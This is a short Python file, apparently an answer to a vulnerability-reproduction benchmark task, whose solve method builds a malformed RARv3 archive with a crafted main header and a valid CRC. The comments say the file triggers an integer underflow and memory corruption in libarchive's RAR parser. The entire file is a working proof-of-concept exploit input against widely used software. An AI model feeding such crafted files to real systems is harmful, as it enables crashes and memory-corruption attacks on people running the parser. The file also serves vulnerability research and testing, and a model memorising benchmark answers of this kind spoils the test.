import zlib
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is an integer underflow in the libarchive RAR parser when
        calculating an 'archive_start_offset'. The calculation is:
        `offset = pos_av - head_size`.
        By setting `pos_av` to 0 and `head_size` to a positive value,
        the offset becomes negative, leading to memory corruption.

        This PoC constructs a minimal RARv3 file with a single 'main header'
        block crafted to trigger this condition.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        # RARv3 file marker
        poc = b'Rar!\x1a\x07\x00'

        # Main archive header block (HEAD_TYPE = 0x73)
        head_type = b'\x73'

        # Set MAIN_HD_AV flag (0x0020) to trigger parsing of the 'pos_av' field.
        flags = struct.pack('<H', 0x0020)

        # Set head_size to a value greater than pos_av. The minimal size for
        # this block is 12 bytes (7 for base header + 5 for AV data).
        head_size_val = 12
        head_size = struct.pack('<H', head_size_val)

        # Set pos_av to 0. This data field is present because MAIN_HD_AV is set.
        # It consists of high_pos_av (1 byte) and pos_av (4 bytes).
        av_data = b'\x00' * 5

        # For the parser to process the block, the CRC must be correct.
        # The CRC is calculated over the block's content, excluding the CRC field itself.
        # The content length is head_size_val - 2 bytes.
        crc_data = head_type + flags + head_size + av_data
        
        # libarchive uses zlib.crc32 and checks the lower 16 bits.
        crc_val = zlib.crc32(crc_data) & 0xFFFF
        head_crc = struct.pack('<H', crc_val)

        # Assemble the complete block and append it to the PoC.
        main_header_block = head_crc + crc_data
        poc += main_header_block
        
        return poc
